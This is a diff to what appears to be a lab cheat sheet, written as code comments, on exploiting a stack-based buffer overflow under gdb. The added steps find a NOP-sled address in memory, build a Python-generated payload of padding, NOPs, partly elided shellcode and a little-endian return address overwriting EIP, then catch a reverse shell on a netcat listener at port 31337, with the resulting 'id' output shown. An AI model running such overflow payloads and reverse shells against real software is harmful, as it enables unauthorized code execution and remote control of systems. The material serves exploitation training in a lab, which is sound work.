@@ -7,6 +7,9 @@
 # gdb -M intel
 # set disassembly-flavor intel
 # $ echo 'set disassembly-flavor intel' > ~/.gdbinit
+# 
+# Stack Size
+# info proc mapping
 #
 # Steps to exploit Stack-Based Buffer Overflow
 #
@@ -44,8 +47,33 @@
 # x/2000xb $esp+550
 # Check that after Us and NOPs there are exact your exploit's bytes "\xda\xca\xba\xe4..."
 # 
-# Stack Size
-# info proc mapping
+# Step 5
+# Get the real address for overwriting EIP
+# Load payload as in Step 4 and inspect the memory
+# Find the address where still NOPs are going by which close to exploit's code
+# (gdb) x/2000xb $esp+1400
 #
+# <SKIP>
+# 0xffffd5ec: 0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+# 0xffffd5f4: 0x55    0x55    0x55    0x55    0x55    0x55    0x90    0x90
+                                # End of "\x55"s   ---->|  |---> NOPS
+# 0xffffd5fc: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+# 0xffffd604: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+# <SKIP>
+# 0xffffd654: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+# 0xffffd65c: 0x90    0x90    0xda    0xca    0xba    0xe4    0x11    0xd4
+# In this example it can be 0xffffd654
 #
-
+# Step 6
+# Modify the payload by adding a target address
+# run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x54\xD6\xFF\xFF"')
+# Pay attention: in the example we use a Little-Endian. It depends on the target architecture
+#
+# Step 7
+# Run NC listener and exploit the app
+# $ nc -nlvp 31337
+# Listening on [0.0.0.0] (family 0, port 31337)
+# (gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
+# Connection from 127.0.0.1 33504 received!
+# id
+# uid=1000(student) gid=1000(student) 
